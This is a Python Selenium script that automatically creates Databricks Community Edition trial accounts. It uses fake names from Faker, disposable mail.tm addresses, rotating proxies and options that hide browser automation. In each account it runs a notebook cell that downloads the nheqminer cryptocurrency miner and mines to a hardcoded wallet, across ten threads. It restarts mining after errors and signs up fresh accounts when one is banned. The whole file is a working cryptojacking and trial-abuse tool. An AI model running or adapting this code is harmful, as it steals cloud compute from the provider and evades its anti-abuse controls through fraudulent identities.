from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time
import string
import random
import os
import threading
import json
from faker import Faker

multitab = 10
wallet   ="RDD9mUShEa4WU894zdknpkZJnLbLeWMXf4"
worker   =".DATABRICKS"
scriptmining= "!wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tar.gz && ./nheqminer/nheqminer -v -l eu.luckpool.net:3960 -u "+wallet+worker+" -p x -t 2"
passwork   ="1234Abcdf@"
timeopen=300
timewaiting=300
print('''
  
  ###########################################################################        
           ____            ____              ____            _           _   
          |  _ \ ___  _ __|  _ \ __ _ _ __  |  _ \ _ __ ___ (_) ___  ___| |_ 
          | |_) / _ \| '__| |_) / _` | '__| | |_) | '__/ _ \| |/ _ \/ __| __|
          |  __/ (_) | |  |  __/ (_| | |    |  __/| | | (_) | |  __/ (__| |_ 
          |_|   \___/|_|  |_|   \__,_|_|    |_|   |_|  \___// |\___|\___|\__|
                                                      |__/               
                                                           Not my Idea at all
  ###########################################################################

  ''') 

faker = Faker()
def resultproxy():
   with open("proxy.json") as f:
      data = json.load(f)
      time.sleep(2)
      size =len(data['proxy'])
      if size==1 :
         print(data['proxy'][0])
         return data['proxy'][0]
      else :
         print(data['proxy'][random.randint(0,size)])
         return data['proxy'][random.randint(0,size)]
        
def regdatabrick(driver,waiting):
  firstname=faker.first_name()
  lastname=faker.last_name()
  title= faker.state()
  company=faker.company()
  print("Chrome",waiting,"Reg Mail && Databricks" )
  driver.get("https://mail.tm/en/")
  time.sleep(4)
  gmail=driver.execute_script("return JSON.parse(localStorage.getItem('vuex')).accounts.list[0].address")
  print("Chrome",waiting,gmail)
  time.sleep(2)
  driver.get('https://databricks.com/try-databricks')
  time.sleep(3)
  driver.find_element_by_xpath('//*[@id="FirstName"]').send_keys(firstname)
  time.sleep(1)
  driver.find_element_by_xpath('//*[@id="LastName"]').send_keys(lastname)
  time.sleep(1)
  driver.find_element_by_xpath('//*[@id="Company"]').send_keys(company)
  time.sleep(1)
  driver.find_element_by_xpath('//*[@id="Email"]').send_keys(gmail)
  time.sleep(1)
  tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(title)
  tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(title)
  time.sleep(2)
  checkboxElement = driver.find_element_by_id("mkto_form_consent")
  checkboxElement.send_keys(Keys.SPACE)
  time.sleep(2)
  driver.find_element_by_xpath('//*[@id="submitToMktoForm_2021Feb10"]/div[21]/span/button').click()
  time.sleep(20)          
  checkboxElementw = driver.find_element_by_xpath('//*[@id="ce-placeholder-button"]')
  checkboxElementw.send_keys(Keys.ENTER)
  time.sleep(5)
  
  print("Check Mail")
  time.sleep(30)
  driver.maximize_window()
  driver.get("https://mail.tm/en/")
  time.sleep(5)
  driver.find_element_by_xpath('//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul/li/a/div').click()
  time.sleep(5)
  seq = driver.find_elements_by_tag_name('iframe')
  for x in range(0, len(seq)):
        driver.switch_to.default_content()
        try:
            driver.switch_to.frame(int(x))
            activelink= driver.find_element_by_xpath('/html/body/p[2]/a')
            activelink.click()
            break
        except:
            continue
          
  driver.minimize_window()
  print("Chrome",waiting,"Reset Passwords && Setup Mining")
  time.sleep(2)
  driver.switch_to_default_content()
  handles = driver.window_handles
  size = len(handles)
  for x in range(size):
   if handles[x] != driver.current_window_handle:
     driver.switch_to.window(handles[x])
  time.sleep(2)
  driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[1]/input').send_keys(passwork)
  driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[2]/input').send_keys(passwork)
  time.sleep(1)
  driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[3]/button').click()
  time.sleep(2)
  with open("account"+str(waiting)+".json") as f:
      data = json.load(f)
      time.sleep(2)
      data['acc'].append(gmail)
      print(data)
      time.sleep(2)
      with open("account"+str(waiting)+".json", "w") as outfile:
        json.dump(data, outfile)
def login(driver,waiting):
 time.sleep(2)
 with open("account"+str(waiting)+".json") as f:
      data = json.load(f)
      time.sleep(1)
      size= len(data['acc'])
      gmail=data['acc'][size-1]
      time.sleep(1)
      print("Chrome",waiting,gmail)
 time.sleep(5)   
 driver.get("https://community.cloud.databricks.com/login.html")
 time.sleep(5)
 driver.find_element_by_xpath('//*[@id="login-email"]').send_keys(gmail)
 time.sleep(5)
 driver.find_element_by_xpath('//*[@id="login-password"]').send_keys(passwork)
 time.sleep(5)
 driver.find_element_by_xpath('//*[@id="login-container"]/div/div/div[4]/button').click()
 time.sleep(5)
 print("Chrome",waiting,"Login OK...")
def autodatabricks(driver,waiting):  
 time.sleep(20)
 print("Chrome",waiting,":Setup Note")
 driver.switch_to_default_content()
 time.sleep(4)    
 driver.find_element_by_xpath('//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]').click()
 time.sleep(4)
 driver.find_element_by_xpath('//*[@id="input"]').send_keys("prog")
 time.sleep(4)
 driver.find_element_by_xpath('/html/body/div[7]/div/div/uses-legacy-bootstrap/uses-legacy-bootstrap/button[2]').click()
 time.sleep(15)
 driver.find_element_by_css_selector(".CodeMirror-line").click()
 driver.find_element_by_css_selector(".CodeMirror textarea").send_keys(scriptmining)
 driver.find_element_by_css_selector(".fa-play").click()
 driver.find_element_by_css_selector(".run-cell > .fa").click()
 driver.find_element_by_xpath("/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[1]/div/div/input").click()
 driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click()
 time.sleep(4)
 driver.minimize_window()
 clearConsole()
 print("Chrome",waiting,"Start Mining Coin .....")
 while (True):
     time.sleep(120)
     driver.refresh()
     clearConsole()
     time.sleep(10)
     print("Chrome",waiting,"Check vps")
     if driver.title == "Login - Databricks Community Edition" :
          print("Chrome :",waiting,"Databricks logout")
          login(driver,waiting)
          time.sleep(5)
          ckeckerrorlogin= checkvps(driver,'//*[@id="login-container"]/div/div/div[4]')
          if ckeckerrorlogin== True:
            print("Chrome :",waiting,"Databricks die")
            delete_cache(driver)
            driver.close()
            driver.quit()
            time.sleep(timewaiting)
            newauto(waiting)
          driver.find_element_by_xpath('//*[@id="sidebar"]/div/div[1]/nav/div[4]/div[1]/div[2]/button[1]').click()
          time.sleep(1)
          driver.find_element_by_xpath('//*[@id="filebrowser-popup"]/div[2]/div/nav[1]/ul/li[3]/a').click()
          time.sleep(1)
          driver.find_element_by_xpath('//*[@id="filebrowser-popup"]/div[2]/div/nav[2]/ul/li[2]/a').click()
          time.sleep(1)
          driver.find_element_by_xpath('//*[@id="filebrowser-popup"]/div[2]/div/nav[3]/ul/li[2]/a').click()
     time.sleep(5)       
     checkerrora=checkvps(driver,'//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[1]/div[2]/div[2]/div/div[3]/div[2]/div[1]/div/div[2]/div/span/div')
     checkerrorb=checkvps(driver,'//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[1]/div[2]/div[2]/div/div[3]/div[2]')
     if checkerrora==True :
       if (driver.find_element_by_xpath('//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[1]/div[2]/div[2]/div/div[3]/div[2]/div[1]/div/div[2]/div/span/div').text == "The spark driver has stopped unexpectedly and is restarting. Your notebook will be automatically reattached."):
         print("Chrome",waiting,"ERROR ==> The spark driver has stopped unexpectedly and is restarting. Your notebook will be automatically reattached.")
         driver.find_element_by_css_selector(".fa-play").click()
         driver.find_element_by_css_selector(".run-cell > .fa").click()
       if (driver.find_element_by_xpath('//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[1]/div[2]/div[2]/div/div[3]/div[2]/div[1]/div/div[2]/div/span/div').text == "Internal error, sorry. Attach your notebook to a different cluster or restart the current cluster."):
         print("Chrome",waiting,"ERROR ==>Internal error, sorry. Attach your notebook to a different cluster or restart the current cluster.")
         driver.find_element_by_css_selector(".fa-play").click()
         driver.find_element_by_css_selector(".run-cell > .fa").click()
       if (driver.find_element_by_xpath('//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[1]/div[2]/div[2]/div/div[3]/div[2]/div[1]/div/div[2]/div/span/div').text == "Cancelled"):
         print("Chrome",waiting,"ERROR ==> Cancelled")
         driver.find_element_by_css_selector(".fa-play").click()
         driver.find_element_by_css_selector(".run-cell > .fa").click()
     if checkerrorb==True :     
       if (driver.find_element_by_xpath('//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[1]/div[2]/div[2]/div/div[3]/div[2]').text == ""):
         print("Chrome",waiting,"ERROR ==> STOP VPS")
         driver.find_element_by_css_selector(".fa-play").click()
         driver.find_element_by_css_selector(".run-cell > .fa").click()


     print("Chrome",waiting,driver.title)
     print("Chrome",waiting,"Running Miner Coin...")
     time.sleep(1)
     driver.find_element_by_xpath('//*[@id="clear-results-link"]/i[1]').click()
     time.sleep(1)
     driver.find_element_by_xpath('//*[@id="context-bar"]/div[1]/div[7]/div[2]/li[1]/a').click()
     time.sleep(1)
     driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click()

def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'): 
        command = 'cls'
    os.system(command)
def checkvps(driver,xpath):
    try:
        element = driver.find_element_by_xpath(xpath)
    except NoSuchElementException as e:
        return False
    return True
def reautoreg(waiting):
    autoreg(waiting) 
def autoreg(waiting):
   option = webdriver.ChromeOptions()
   option.add_argument('--headless')
   option.add_experimental_option("excludeSwitches", ["enable-automation"])
   option.add_experimental_option('useAutomationExtension', False)
   option.add_argument('--disable-blink-features=AutomationControlled')
   proxylive = resultproxy()
   time.sleep(2)
   option.add_argument('--proxy-server={}'.format(proxylive))
   time.sleep(10)
   driver = webdriver.Chrome(executable_path="/usr/local/bin/chromedriver",options=option)
   driver.set_window_size(800, 1200)
   driver.minimize_window()
   try:
     regdatabrick(driver,waiting)
     time.sleep(5)
     driver.close()
     driver.quit()
   except:
     delete_cache(driver) 
     driver.quit()
     time.sleep(timewaiting)
     reautoreg(waiting)
def autominer(waiting):
   option = webdriver.ChromeOptions()
   option.add_argument('--headless')
   option.add_experimental_option("excludeSwitches", ["enable-automation"])
   option.add_experimental_option('useAutomationExtension', False)
   option.add_argument('--disable-blink-features=AutomationControlled')
   option.add_argument("--disable-extensions")
   drivers = webdriver.Chrome(executable_path="/usr/local/bin/chromedriver",options=option)
   drivers.set_window_size(800, 1200)
   drivers.minimize_window()
   try:
     login(drivers,waiting)
     autodatabricks(drivers,waiting)
   except:
     delete_cache(drivers) 
     driver.quit()
     time.sleep(timewaiting)
     reautominer(waiting)
     
def reautominer(waiting):
    autominer(waiting)     
def auto(waiting):
     autoreg(waiting)
     autominer(waiting)

def delete_cache(driver):
    driver.execute_script("window.open('');")
    driver.minimize_window()
    time.sleep(2)
    driver.switch_to.window(driver.window_handles[-1])
    time.sleep(2)
    driver.get('chrome://settings/clearBrowserData') # for old chromedriver versions use cleardriverData
    time.sleep(2)
    actions = ActionChains(driver) 
    actions.send_keys(Keys.TAB * 3 + Keys.DOWN * 3) # send right combination
    actions.perform()
    time.sleep(2)
    actions = ActionChains(driver) 
    actions.send_keys(Keys.TAB * 4 + Keys.ENTER) # confirm
    actions.perform()
    time.sleep(5) # wait some time to finish
    driver.close() # close this tab
    driver.switch_to.window(driver.window_handles[0]) # switch back
    
def newauto(waiting):    
     time.sleep(2)
     auto(waiting)
def multichrome(l):
    print("Start Chrome",l,":Runing...")    
    auto(l)
def startauto():
    threads =[]
    for l in range(multitab):
        threads += [threading.Thread(target=multichrome,args={l})]
    for t in threads:
        t.start()
        time.sleep(timeopen)        
    for t in threads:
        t.join()
    print("End Multi Chrome Tab")

startauto()
